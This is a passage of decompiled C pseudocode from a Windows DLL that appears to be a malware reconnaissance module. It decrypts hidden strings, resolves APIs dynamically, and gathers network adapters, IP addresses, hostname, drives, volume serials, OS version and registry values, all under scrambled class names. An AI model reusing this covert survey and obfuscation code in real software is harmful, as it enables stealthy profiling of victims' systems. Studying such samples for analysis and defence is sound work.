  if ( !ProcAddress || !v37 )
  {
    LastError = GetLastError();
    FreeLibrary(v9);
    return LastError;
  }
  v52 = 0;
  v50 = 0;
  v54 = 0;
  v11 = a2;
  v12 = 0;
  v38 = 0;
  v34 = 0;
  v35 = 0;
  v36 = 0;
  v53 = 0;
  *a5 = 0;
  if ( a2 > 0x64 )
    v11 = 100;
  v13 = ((int (__stdcall *)(int, int, _DWORD, unsigned int, int, unsigned int *, int *))v37)(
          a3,
          a4,
          0,
          v11,
          -1,
          &v52,
          &v53);
  v14 = v53;
  v51 = v13;
LABEL_10:
  if ( !v51 || v51 == 234 )
  {
    v15 = v52;
    *v7 += v52;
    if ( v54 || v12 >= a2 )
    {
      v54 = 1;
      goto LABEL_42;
    }
    if ( !v15 )
      goto LABEL_42;
    v16 = 0;
    v47 = 0;
    v39 = 0;
    v43 = 0;
    v17 = (_DWORD *)(a1 + 40 * v12);
    v18 = a1 + 48 * v12;
    v40 = 20 * v12;
    v19 = v12;
    v20 = (char *)(a1 + 36 * v12);
    v41 = 18 * v19;
    while ( 1 )
    {
      if ( a4 == 1 )
      {
        v34 = v14;
        v46 = v14 + v39;
        v25 = wcslen(*(const wchar_t **)(v14 + v39)) + 1;
        v26 = 15;
        if ( v25 < 0xF )
          v26 = wcslen(*(const wchar_t **)v46) + 1;
        v49 = 2 * v26;
        memcpy(v17, *(const void **)v46, 2 * v26);
        *(_WORD *)(a1 + 2 * (v49 + v40)) = 0;
        v17[8] = *(_DWORD *)(v46 + 8);
        goto LABEL_30;
      }
      if ( a4 == 2 )
        break;
      if ( a4 == 3 )
      {
        v36 = v14;
        v44 = (const wchar_t **)(v14 + v43);
        v21 = 2 * wcslen(*(const wchar_t **)(v14 + v43)) + 2;
        v22 = 30;
        if ( v21 < 0x1E )
          v22 = 2 * wcslen(*v44) + 2;
        v48 = v22;
        memcpy(v20, *v44, v22);
        *(_WORD *)(a1 + 2 * (v48 + v41)) = 0;
LABEL_30:
        v16 = v47;
        v14 = v53;
      }
      ++v38;
      v41 += 18;
      v40 += 20;
      v43 += 20;
      v39 += 24;
      v20 += 36;
      v18 += 48;
      v17 += 10;
      v47 = ++v16;
      if ( v16 >= v52 )
      {
        if ( !v16 )
          goto LABEL_40;
        switch ( a4 )
        {
          case 1:
            v27 = v34;
            v28 = 24 * v16;
            goto LABEL_39;
          case 2:
            v27 = v35;
            v28 = 20 * v16;
LABEL_39:
            v50 = *(_DWORD *)(v28 + v27 - 4);
            break;
          case 3:
            v27 = v36;
            v28 = 20 * v16;
            goto LABEL_39;
        }
LABEL_40:
        ((void (__stdcall *)(int))ProcAddress)(v14);
        v12 = v38;
        v7 = a5;
        v14 = 0;
        v53 = 0;
LABEL_42:
        if ( v51 == 234 )
        {
          if ( v54 || (v29 = a2 - v12, a2 - v12 > 0x64) )
          {
            v29 = 100;
            goto LABEL_47;
          }
          if ( v29 )
          {
LABEL_47:
            v30 = ((int (__stdcall *)(int, int, int, int, int, unsigned int *, int *))v37)(
                    a3,
                    a4,
                    v50,
                    v29,
                    -1,
                    &v52,
                    &v53);
            v14 = v53;
            v51 = v30;
            if ( a4 == 1 )
            {
              v31 = 24 * v52;
LABEL_52:
              v50 = *(_DWORD *)(v31 + v53 - 4);
            }
            else if ( a4 == 2 || a4 == 3 )
            {
              v31 = 20 * v52;
              goto LABEL_52;
            }
            if ( v54 )
            {
              if ( v53 )
              {
                ((void (__stdcall *)(int))ProcAddress)(v53);
                v14 = 0;
                v53 = 0;
              }
            }
          }
          else
          {
            v52 = 0;
          }
        }
        else
        {
          v51 = -2;
        }
        goto LABEL_10;
      }
    }
    v35 = v14;
    v45 = v14 + v43;
    v23 = WideCharToMultiByte(0, 0, *(LPCWCH *)(v14 + v43), -1, (LPSTR)v18, 16, 0, 0);
    if ( v23 > 1 && *(_BYTE *)(v18 + v23 - 2) == 36 )
      --v23;
    *(_BYTE *)(v18 + v23 - 1) = 0;
    *(_DWORD *)(v18 + 44) = *(_DWORD *)(v45 + 8);
    if ( a7 )
    {
      v24 = sub_10008515((char *)v18);
      sub_10008581(hModule, (int)v24, (void *)(v18 + 16));
    }
    goto LABEL_30;
  }
  if ( v14 )
    ((void (__stdcall *)(int))ProcAddress)(v14);
  FreeLibrary(hLibModule);
  if ( v51 == -2 )
    return 0;
  return v51;
}
// 10008BB4: conditional instruction was optimized away because edx.4!=0
// 10008AC4: using guessed type int var_8;

//----- (10008E41) --------------------------------------------------------
DWORD __thiscall sub_10008E41(void *this)
{
  int v1; // ebx
  const CHAR *v2; // eax
  HMODULE LibraryA; // edi
  DWORD result; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  FARPROC v7; // edi
  const CHAR *v8; // eax
  FARPROC v9; // eax
  int (__stdcall *v10)(char *, int *); // esi
  DWORD LastError; // eax
  char *v12; // edi
  int v13; // esi
  size_t v14; // eax
  char *v15; // eax
  _DWORD *v16; // ecx
  int v17; // edx
  unsigned int v18; // ebx
  int v19; // ebx
  int v20; // edx
  int v21; // eax
  char *v22; // ebx
  char *v23; // ecx
  char *v24; // [esp-10h] [ebp-98h]
  const CHAR *v25; // [esp-Ch] [ebp-94h]
  int v26; // [esp+8h] [ebp-80h] BYREF
  int v27; // [esp+Ch] [ebp-7Ch] BYREF
  int v28; // [esp+10h] [ebp-78h] BYREF
  HMODULE hModule; // [esp+14h] [ebp-74h]
  int v30; // [esp+18h] [ebp-70h]
  int v31; // [esp+1Ch] [ebp-6Ch]
  int v32; // [esp+20h] [ebp-68h]
  int v33; // [esp+24h] [ebp-64h]
  FARPROC ProcAddress; // [esp+28h] [ebp-60h]
  int v35[130]; // [esp+2Ch] [ebp-5Ch] BYREF
  char v36; // [esp+234h] [ebp+1ACh] BYREF
  char v37[412]; // [esp+4360h] [ebp+42D8h] BYREF
  int v38; // [esp+44FCh] [ebp+4474h]
  int v39; // [esp+7600h] [ebp+7578h] BYREF
  char v40; // [esp+7604h] [ebp+757Ch] BYREF
  char Buf1[104]; // [esp+77E4h] [ebp+775Ch] BYREF

  v32 = 0;
  v1 = (int)this;
  v31 = (int)this;
  v26 = 12960;
  v28 = 17204;
  v27 = 484;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001DB40);
  LibraryA = LoadLibraryA(v2);
  hModule = LibraryA;
  if ( !LibraryA )
  {
    result = GetLastError();
    *(_DWORD *)(v1 + 16) = result;
    return result;
  }
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001DB64);
  ProcAddress = GetProcAddress(LibraryA, v5);
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001DB88);
  v7 = GetProcAddress(LibraryA, v6);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001DBA8);
  v9 = GetProcAddress(hModule, v8);
  v10 = (int (__stdcall *)(char *, int *))v9;
  if ( ProcAddress && v7 && v9 )
  {
    LastError = ((int (__stdcall *)(int *, int *, _DWORD))v7)(v35, &v28, 0);
    if ( !LastError )
    {
      LastError = ((int (__stdcall *)(int *, int *, _DWORD))ProcAddress)(&v39, &v27, 0);
      if ( !LastError )
      {
        LastError = v10(v37, &v26);
        if ( !LastError )
        {
          ProcAddress = 0;
          if ( v35[0] )
          {
            v12 = &v36;
            do
            {
              if ( *(_DWORD *)v12 != 24 )
              {
                v13 = v1 + 124 * *(unsigned __int8 *)(v1 + 20);
                lstrcpynA((LPSTR)(v13 + 32), v12 + 88, 45);
                *(_BYTE *)(v13 + 24) = *v12;
                *(_BYTE *)(v13 + 25) = v12[28];
                *(_DWORD *)(v13 + 28) = *((_DWORD *)v12 - 1);
                v14 = *((_DWORD *)v12 + 3);
                if ( v14 >= 6 )
                  v14 = 6;
                memcpy((void *)(v13 + 78), v12 + 16, v14);
                v33 = 0;
                if ( v39 )
                {
                  v15 = &v40;
                  v16 = (_DWORD *)(v13 + 88);
                  v30 = v39;
                  do
                  {
                    if ( *((_DWORD *)v15 + 1) == *((_DWORD *)v12 - 1) && v33 < 3 )
                    {
                      v17 = *(_DWORD *)v15;
                      v18 = *(_DWORD *)v15 ^ 0xFFFFA8C0;
                      *(v16 - 1) = *(_DWORD *)v15;
                      if ( !(_WORD)v18 )
                      {
                        v19 = v32++;
                        dword_10025A88[v19] = v17;
                      }
                      v20 = *((_DWORD *)v15 + 2);
                      ++v33;
                      *v16 = v20;
                      v16 += 2;
                    }
                    v15 += 24;
                    --v30;
                  }
                  while ( v30 );
                }
                v21 = *((_DWORD *)v12 - 1);
                v22 = v37;
                if ( v38 != v21 )
                {
                  do
                  {
                    v23 = *(char **)v22;
                    if ( !*(_DWORD *)v22 )
                      break;
                    v22 = *(char **)v22;
                  }
                  while ( *((_DWORD *)v23 + 103) != v21 );
                }
                if ( *((_DWORD *)v22 + 103) == v21 )
                {
                  *(_DWORD *)(v13 + 120) = inet_addr(v22 + 472);
                  if ( *((_DWORD *)v22 + 137) )
                  {
                    *(_DWORD *)(v13 + 112) = inet_addr(v22 + 556);
                    *(_DWORD *)(v13 + 116) = inet_addr(v22 + 596);
                  }
                  if ( *((_DWORD *)v22 + 105) )
                    *(_DWORD *)(v13 + 108) = inet_addr(v22 + 512);
                }
                sub_1000813F(*(_DWORD *)(v13 + 28), (_DWORD *)(v13 + 124), v35);
                v25 = v22 + 8;
                v24 = v22 + 268;
                v1 = v31;
                if ( sub_10008981(v24, v25, (LPBYTE)Buf1) )
                  sub_1000818A(Buf1, (_WORD *)(v13 + 140), (_WORD *)(v13 + 142), (int *)(v13 + 144));
                if ( ++*(_BYTE *)(v1 + 20) == 5 )
                  break;
              }
              ProcAddress = (FARPROC)((char *)ProcAddress + 1);
              v12 += 860;
            }
            while ( (unsigned int)ProcAddress < v35[0] );
          }
          return FreeLibrary(hModule);
        }
      }
    }
  }
  else
  {
    LastError = GetLastError();
  }
  *(_DWORD *)(v1 + 16) = LastError;
  return FreeLibrary(hModule);
}
// 10025A88: using guessed type int dword_10025A88[15];

//----- (10009116) --------------------------------------------------------
DWORD __thiscall sub_10009116(int this, char a2)
{
  HMODULE LibraryA; // eax
  DWORD result; // eax
  FARPROC v5; // eax
  size_t v6; // eax
  const CHAR *v7; // eax
  size_t v8; // eax
  DWORD v9; // eax
  HMODULE v10; // edi
  const CHAR *v11; // [esp-8h] [ebp-24h]
  void (__stdcall *v12)(wchar_t *); // [esp+8h] [ebp-14h]
  FARPROC ProcAddress; // [esp+Ch] [ebp-10h]
  HMODULE hModule; // [esp+10h] [ebp-Ch]
  int v15; // [esp+14h] [ebp-8h] BYREF
  wchar_t *String; // [esp+18h] [ebp-4h] BYREF

  LibraryA = LoadLibraryA(lpModuleName);
  hModule = LibraryA;
  if ( LibraryA )
  {
    String = (wchar_t *)GetProcAddress(LibraryA, dword_10026CE8);
    ProcAddress = GetProcAddress(hModule, dword_10026D00);
    v5 = GetProcAddress(hModule, dword_10026CFC);
    v12 = (void (__stdcall *)(wchar_t *))v5;
    if ( String && v5 && ProcAddress )
    {
      v15 = 0;
      if ( ((int (__stdcall *)(_DWORD, int, int *))String)(0, 102, &v15) )
      {
        *(_DWORD *)(this + 5432) = GetLastError();
      }
      else
      {
        if ( wcslen(*(const wchar_t **)(v15 + 8)) <= 0x1E )
          v6 = wcslen(*(const wchar_t **)(v15 + 8));
        else
          v6 = 30;
        wcsncpy(&word_10026BD4, *(const wchar_t **)(v15 + 8), v6);
        WideCharToMultiByte(0, 0, *(LPCWCH *)(v15 + 8), -1, (LPSTR)(this + 5436), 30, 0, 0);
      }
      if ( sub_1000C8E9(this, (int)&dword_10026D20, 1u, 0)
        || (v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001DD20), sub_1000D2B2(v7)) )
      {
        String = 0;
        if ( ((int (__stdcall *)(_DWORD, _DWORD, wchar_t **))ProcAddress)(0, *(_DWORD *)(v15 + 8), &String) )
        {
          *(_DWORD *)(this + 5432) = GetLastError();
        }
        else
        {
          v8 = wcslen(String);
          memcpy((void *)(this + 5468), String, 2 * v8 + 2);
          v9 = sub_10008AC4(this + 5524, 0x19u, (int)String, 1, (_DWORD *)(this + 5512), 0, a2);
          v11 = lpLibFileName;
          *(_DWORD *)(this + 5500) = v9;
          v10 = LoadLibraryA(v11);
          *(_DWORD *)(this + 5504) = sub_10008AC4(this + 6524, 0x32u, (int)String, 2, (_DWORD *)(this + 5516), v10, a2);
          if ( v10 )
            FreeLibrary(v10);
          *(_DWORD *)(this + 5508) = sub_10008AC4(this + 8924, 0x19u, (int)String, 3, (_DWORD *)(this + 5520), 0, a2);
        }
        if ( String )
          v12(String);
      }
      if ( v15 )
        v12((wchar_t *)v15);
    }
    return FreeLibrary(hModule);
  }
  else
  {
    result = GetLastError();
    *(_DWORD *)(this + 5432) = result;
  }
  return result;
}
// 10026D20: using guessed type int dword_10026D20;

//----- (10009322) --------------------------------------------------------
DWORD __thiscall sub_10009322(wchar_t *this)
{
  wchar_t *v2; // edi
  DWORD result; // eax
  const CHAR *v4; // eax
  int v5; // [esp+Ch] [ebp-80h]
  unsigned __int8 v6; // [esp+13h] [ebp-79h] BYREF
  struct WSAData WSAData; // [esp+14h] [ebp-78h] BYREF
  WCHAR WideCharStr[32]; // [esp+1A4h] [ebp+118h] BYREF
  char name[32]; // [esp+1E4h] [ebp+158h] BYREF

  v2 = this + 4920;
  v5 = 0;
  *((_DWORD *)this + 2456) = sub_10008AC4((int)(this + 4920), 0xAu, 0, 1, (_DWORD *)this + 2458, 0, 0);
  *((_DWORD *)this + 2457) = sub_10008AC4((int)(this + 5120), 0xAu, 0, 3, (_DWORD *)this + 2459, 0, 0);
  memset(&WSAData, 0, sizeof(WSAData));
  if ( !WSAStartup(0x101u, &WSAData) )
    gethostname(name, 30);
  WSACleanup();
  result = MultiByteToWideChar(0, 0, name, -1, WideCharStr, 30);
  if ( result )
  {
    for ( ; v2; v2 += 20 )
    {
      if ( v5 >= 10 )
        break;
      v6 = 0;
      v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001DD44);
      result = sub_10008385(0, v2, &v6, WideCharStr, v4);
      if ( result )
      {
        *((_DWORD *)this + 2650) = result;
      }
      else
      {
        result = v6;
        *((_DWORD *)v2 + 9) = v6;
      }
      ++v5;
    }
  }
  else
  {
    result = GetLastError();
    *((_DWORD *)this + 2650) = result;
  }
  return result;
}

//----- (10009450) --------------------------------------------------------
int __thiscall sub_10009450(void *this)
{
  int result; // eax

  result = sub_1000C8E9((int)this, (int)&dword_10026D30, 1u, 0);
  if ( result )
  {
    sub_10008E41(this);
    sub_100074F2((char *)this);
    sub_1000799A((int)this);
    sub_10007B5A((CHAR *)this);
    sub_10007D20((int)this);
    sub_10007E63((const CHAR *)this);
    sub_10007F8E((char *)this);
    sub_10009116((int)this, 0);
    if ( sub_1000C8E9((int)this, (int)&dword_10026D10, 1u, 0) )
      sub_1000870D((CHAR *)this, 0);
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  }
  return result;
}
// 10026D10: using guessed type int dword_10026D10;
// 10026D30: using guessed type int dword_10026D30;

//----- (100094CA) --------------------------------------------------------
BOOL __usercall sub_100094CA@<eax>(int a1@<ecx>, int a2@<ebp>)
{
  void *v2; // esp
  const CHAR *v3; // eax
  unsigned int v4; // ebx
  const CHAR *v5; // eax
  FARPROC ProcAddress; // eax
  int *v7; // edi
  int v10; // [esp-80h] [ebp-4344h] BYREF
  HMODULE LibraryA; // [esp-7Ch] [ebp-4340h]
  _DWORD v12[30]; // [esp-78h] [ebp-433Ch] BYREF
  char v13; // [esp+0h] [ebp-42C4h] BYREF
  unsigned int v14; // [esp+42BCh] [ebp-8h]
  int v15; // [esp+42C0h] [ebp-4h]

  sub_10009322((wchar_t *)a1);
  v15 = a2;
  v2 = alloca(17216);
  v14 = (unsigned int)&v13 ^ dword_100249C0;
  v10 = 17204;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001DDF4);
  v4 = 0;
  LibraryA = LoadLibraryA(v3);
  if ( LibraryA
    && (v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001DE18), (ProcAddress = GetProcAddress(LibraryA, v5)) != 0) )
  {
    if ( !((int (__cdecl *)(_DWORD *, int *, _DWORD))ProcAddress)(v12, &v10, 0) && *(_BYTE *)(a1 + 20) )
    {
      v7 = (int *)(a1 + 28);
      do
      {
        sub_1000813F(*v7, v7 + 26, v12);
        ++v4;
        v7 += 31;
      }
      while ( v4 < *(unsigned __int8 *)(a1 + 20) );
    }
  }
  else
  {
    *(_DWORD *)(a1 + 16) = GetLastError();
  }
  return FreeLibrary(LibraryA);
}
// 100094CA: could not find valid save-restore pair for ebp
// 100249C0: using guessed type int dword_100249C0;

//----- (100094DA) --------------------------------------------------------
_DWORD *__thiscall sub_100094DA(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 22;
  *this = &PFHVtanpynem::`vftable';
  memset(this + 2, 0, 0x118u);
  *v2 = this[1];
  return this;
}
// 1001E26C: using guessed type void *PFHVtanpynem::`vftable';

//----- (10009508) --------------------------------------------------------
int sub_10009508()
{
  return 280;
}

//----- (1000950E) --------------------------------------------------------
char __thiscall sub_1000950E(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x118 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x118u);
  return 1;
}

//----- (10009533) --------------------------------------------------------
void *__thiscall sub_10009533(int this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  void *result; // eax
  char *v7; // esi
  size_t v8; // eax
  size_t v9; // eax
  const CHAR *v10; // [esp-10h] [ebp-38h]
  const CHAR *v11; // [esp-10h] [ebp-38h]
  const CHAR *v12; // [esp-10h] [ebp-38h]
  BYTE *v13; // [esp-Ch] [ebp-34h]
  DWORD cchValueName; // [esp+Ch] [ebp-1Ch] BYREF
  DWORD dwIndex; // [esp+10h] [ebp-18h]
  HKEY phkResult; // [esp+14h] [ebp-14h] BYREF
  CHAR ValueName; // [esp+18h] [ebp-10h] BYREF
  int v18; // [esp+19h] [ebp-Fh]
  int v19; // [esp+1Dh] [ebp-Bh]
  char v20; // [esp+21h] [ebp-7h]

  v13 = (BYTE *)(this + 16);
  v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001E018);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E040);
  if ( sub_100026CC(HKEY_LOCAL_MACHINE, v2, v10, v13, 4u, 0) )
    *(_DWORD *)(this + 12) = GetLastError();
  v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001E088);
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001E0A8);
  if ( sub_100026CC(HKEY_LOCAL_MACHINE, v3, v11, (LPBYTE)(this + 20), 4u, 0) )
    *(_DWORD *)(this + 12) = GetLastError();
  v12 = (const CHAR *)sub_1000C0E0((int)&unk_1001E104);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001E128);
  if ( sub_100026CC(HKEY_LOCAL_MACHINE, v4, v12, (LPBYTE)(this + 24), 4u, 0) )
    *(_DWORD *)(this + 12) = GetLastError();
  phkResult = 0;
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E198);
  result = (void *)RegOpenKeyExA(HKEY_LOCAL_MACHINE, v5, 0, 0x20019u, &phkResult);
  if ( result )
  {
    *(_DWORD *)(this + 12) = result;
  }
  else
  {
    ValueName = 0;
    v18 = 0;
    v19 = 0;
    dwIndex = 0;
    cchValueName = 10;
    v20 = 0;
    v7 = (char *)(this + 28);
    do
    {
      result = (void *)RegEnumValueA(phkResult, dwIndex, &ValueName, &cchValueName, 0, 0, 0, 0);
      if ( result )
        break;
      v8 = strlen(&ValueName) <= 0xA ? strlen(&ValueName) : 10;
      strncpy(v7, &ValueName, v8);
      ++dwIndex;
      v7 += 10;
      cchValueName = 10;
      v9 = strlen(&ValueName);
      result = memset(&ValueName, 0, v9);
    }
    while ( dwIndex < 0xA );
  }
  if ( phkResult )
    return (void *)RegCloseKey(phkResult);
  return result;
}

//----- (100096B8) --------------------------------------------------------
void *__thiscall sub_100096B8(char *this, HKEY hKey)
{
  const CHAR *v3; // eax
  void *result; // eax
  char *v5; // edi
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  DWORD cbData; // [esp+10h] [ebp-2Ch] BYREF
  DWORD cchValueName; // [esp+14h] [ebp-28h] BYREF
  DWORD dwIndex; // [esp+18h] [ebp-24h]
  HKEY phkResult; // [esp+1Ch] [ebp-20h] BYREF
  BYTE Data; // [esp+20h] [ebp-1Ch] BYREF
  int v15; // [esp+21h] [ebp-1Bh]
  int v16; // [esp+25h] [ebp-17h]
  int v17; // [esp+29h] [ebp-13h]
  __int16 v18; // [esp+2Dh] [ebp-Fh]
  char v19; // [esp+2Fh] [ebp-Dh]
  CHAR ValueName; // [esp+30h] [ebp-Ch] BYREF
  int v21; // [esp+31h] [ebp-Bh]

  phkResult = 0;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001E220);
  result = (void *)RegOpenKeyExA(hKey, v3, 0, 0x20019u, &phkResult);
  if ( result )
  {
    *((_DWORD *)this + 3) = result;
  }
  else
  {
    Data = 0;
    ValueName = 0;
    v21 = 0;
    v15 = 0;
    v16 = 0;
    v17 = 0;
    v18 = 0;
    v19 = 0;
    dwIndex = 0;
    cbData = 16;
    cchValueName = 5;
    v5 = this + 128;
    do
    {
      result = (void *)RegEnumValueA(phkResult, dwIndex, &ValueName, &cchValueName, 0, 0, &Data, &cbData);
      if ( result )
        break;
      v6 = strlen((const char *)&Data) >= 0x10 ? 16 : strlen((const char *)&Data);
      strncpy(v5, (const char *)&Data, v6);
      ++dwIndex;
      cbData = 16;
      cchValueName = 5;
      v5 += 16;
      v7 = strlen((const char *)&Data);
      memset(&Data, 0, v7);
      v8 = strlen(&ValueName);
      result = memset(&ValueName, 0, v8);
    }
    while ( dwIndex < 0xA );
  }
  if ( phkResult )
    return (void *)RegCloseKey(phkResult);
  return result;
}

//----- (100097DC) --------------------------------------------------------
void *__thiscall sub_100097DC(char *this, HKEY hKey)
{
  sub_10009533((int)this);
  return sub_100096B8(this, hKey);
}

//----- (100097F3) --------------------------------------------------------
_DWORD *__thiscall sub_100097F3(_DWORD *this, char a2)
{
  _DWORD *v3; // edi

  v3 = this + 1416;
  this[1] = 25;
  *this = &CsyLpscmkDwfxvacsy::`vftable';
  *((_BYTE *)this + 25712) = a2;
  memset(this + 1416, 0, 0x4E50u);
  *v3 = this[1];
  return this;
}
// 1001E5C0: using guessed type void *CsyLpscmkDwfxvacsy::`vftable';

//----- (10009830) --------------------------------------------------------
int __thiscall sub_10009830(_BYTE *this)
{
  return this[25712] != 0 ? 5656 : 20048;
}

//----- (10009845) --------------------------------------------------------
char __thiscall sub_10009845(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x4E50 )
    return 0;
  memcpy(a2, (const void *)(this + 5664), 0x4E50u);
  return 1;
}

//----- (1000986D) --------------------------------------------------------
int __thiscall sub_1000986D(_DWORD *this)
{
  int result; // eax
  struct _SYSTEMTIME SystemTime; // [esp+4h] [ebp-18h] BYREF
  struct _FILETIME FileTime; // [esp+14h] [ebp-8h] BYREF

  this[1418] = GetTickCount();
  GetLocalTime(&SystemTime);
  result = SystemTimeToFileTime(&SystemTime, &FileTime);
  if ( result )
  {
    result = sub_100022D7((__int64 *)&FileTime);
    this[1421] = 0;
    this[1420] = result;
  }
  return result;
}

//----- (100098B8) --------------------------------------------------------
void *__thiscall sub_100098B8(void *this)
{
  int v1; // edi
  DWORD LogicalDriveStringsA; // eax
  void *result; // eax
  CHAR *v4; // esi
  _BYTE *v5; // edi
  char DriveTypeA; // al
  bool v7; // cc
  DWORD FileSystemFlags; // [esp+8h] [ebp-80h] BYREF
  int v9; // [esp+Ch] [ebp-7Ch]
  DWORD MaximumComponentLength; // [esp+10h] [ebp-78h] BYREF
  DWORD VolumeSerialNumber; // [esp+14h] [ebp-74h] BYREF
  int *v12; // [esp+18h] [ebp-70h]
  CHAR VolumeNameBuffer[264]; // [esp+1Ch] [ebp-6Ch] BYREF
  CHAR FileSystemNameBuffer[264]; // [esp+124h] [ebp+9Ch] BYREF
  CHAR Buffer[260]; // [esp+22Ch] [ebp+1A4h] BYREF

  v1 = (int)this;
  v9 = (int)this;
  LogicalDriveStringsA = GetLogicalDriveStringsA(0x104u, Buffer);
  if ( LogicalDriveStringsA )
  {
    CharLowerBuffA(Buffer, LogicalDriveStringsA);
    v4 = Buffer;
    if ( Buffer[0] )
    {
      v12 = dword_10026B98;
      v5 = (_BYTE *)(v1 + 5693);
      do
      {
        if ( (int)v12 >= (int)&word_10026BD4 )
          break;
        *(v5 - 1) = *v4;
        DriveTypeA = GetDriveTypeA(v4);
        v7 = *v4 < 99;
        *v5 = DriveTypeA;
        if ( !v7 )
        {
          MaximumComponentLength = 0;
          FileSystemFlags = 0;
          VolumeSerialNumber = 0;
          if ( GetVolumeInformationA(
                 v4,
                 VolumeNameBuffer,
                 0x104u,
                 &VolumeSerialNumber,
                 &MaximumComponentLength,
                 &FileSystemFlags,
                 FileSystemNameBuffer,
                 0x104u) )
          {
            lstrcpynA(v5 + 1, VolumeNameBuffer, 15);
            lstrcpynA(v5 + 17, FileSystemNameBuffer, 10);
            *v12 = VolumeSerialNumber;
          }
        }
        ++v12;
        v4 += 4;
        v5 += 29;
      }
      while ( *v4 );
      v1 = v9;
    }
    return memcpy(&unk_10025ADC, (const void *)(v1 + 5688), 0x1B8u);
  }
  else
  {
    result = (void *)GetLastError();
    *(_DWORD *)(v1 + 5688) = result;
  }
  return result;
}
// 10026B98: using guessed type int dword_10026B98[15];

//----- (100099F2) --------------------------------------------------------
int __thiscall sub_100099F2(int this)
{
  int result; // eax
  _BYTE VersionInformation[156]; // [esp+4h] [ebp-A0h] BYREF

  *(_DWORD *)(this + 6128) = GetVersion();
  memset(VersionInformation, 0, sizeof(VersionInformation));
  *(_DWORD *)VersionInformation = 156;
  if ( GetVersionExA((LPOSVERSIONINFOA)VersionInformation) )
  {
    *(_WORD *)(this + 6132) = *(_WORD *)&VersionInformation[150];
    *(_WORD *)(this + 6134) = *(_WORD *)&VersionInformation[148];
  }
  result = *(_DWORD *)(this + 6128);
  dword_10026C14 = result;
  return result;
}
// 10026C14: using guessed type int dword_10026C14;

//----- (10009A73) --------------------------------------------------------
LPSTR __thiscall sub_10009A73(int this)
{
  LPSTR result; // eax
  DWORD nSize; // [esp+4h] [ebp-18h] BYREF
  CHAR Buffer[16]; // [esp+8h] [ebp-14h] BYREF

  nSize = 16;
  if ( GetComputerNameA(Buffer, &nSize) )
  {
    lstrcpynA((LPSTR)(this + 6140), Buffer, 20);
    return lstrcpynA(String1, Buffer, 20);
  }
  else
  {
    result = (LPSTR)GetLastError();
    *(_DWORD *)(this + 6136) = result;
  }
  return result;
}

//----- (10009ADC) --------------------------------------------------------
DWORD __thiscall sub_10009ADC(CHAR *this)
{
  DWORD result; // eax
  DWORD v3; // ebx
  CHAR *v4; // edi
  CHAR *i; // esi
  CHAR String2[26800]; // [esp+4h] [ebp-68B8h] BYREF
  unsigned int v7; // [esp+68B4h] [ebp-8h]

  if ( sub_1000233F(String2) )
  {
    v3 = 0;
    v4 = String2;
    for ( i = this + 6168; ; i += 21 )
    {
      result = v7;
      if ( v7 >= 0x5A )
        result = 90;
      if ( v3 >= result )
        break;
      lstrcpynA(i, v4, 20);
      ++v3;
      v4 += 268;
    }
  }
  else
  {
    result = GetLastError();
    *((_DWORD *)this + 1541) = result;
  }
  return result;
}

//----- (10009B59) --------------------------------------------------------
void __thiscall sub_10009B59(int this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  FARPROC v6; // eax
  int v7; // eax
  LPCSTR *v8; // edi
  bool *i; // esi
  unsigned int v10; // eax
  bool v11; // al
  int (__stdcall *v12)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+Ch] [ebp-28h]
  int v13; // [esp+10h] [ebp-24h] BYREF
  int v14; // [esp+14h] [ebp-20h] BYREF
  void *Block; // [esp+18h] [ebp-1Ch]
  unsigned int v16; // [esp+1Ch] [ebp-18h] BYREF
  FARPROC v17; // [esp+20h] [ebp-14h]
  int v18; // [esp+24h] [ebp-10h]
  FARPROC ProcAddress; // [esp+28h] [ebp-Ch]
  unsigned int v20; // [esp+2Ch] [ebp-8h]
  HMODULE hModule; // [esp+30h] [ebp-4h]

  v20 = 80;
  v18 = 0;
  v17 = 0;
  v13 = 0;
  v16 = 0;
  v14 = 0;
  Block = malloc(0x10000u);
  if ( Block )
  {
    v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E288);
    hModule = LoadLibraryA(v2);
    if ( !hModule )
      goto LABEL_16;
    v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001E2AC);
    ProcAddress = GetProcAddress(hModule, v3);
    v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001E2D0);
    v17 = GetProcAddress(hModule, v4);
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E2F8);
    v6 = GetProcAddress(hModule, v5);
    v12 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v6;
    if ( !ProcAddress )
      goto LABEL_16;
    if ( v17
      && v6
      && (v7 = ((int (__stdcall *)(_DWORD, _DWORD, int))ProcAddress)(0, 0, 4), (v18 = v7) != 0)
      && (v8 = (LPCSTR *)Block, v12(v7, 0, 48, 3, Block, 0x10000, &v13, &v16, &v14, 0)) )
    {
      if ( !*(_BYTE *)(this + 25712) )
        v20 = 150;
      ProcAddress = 0;
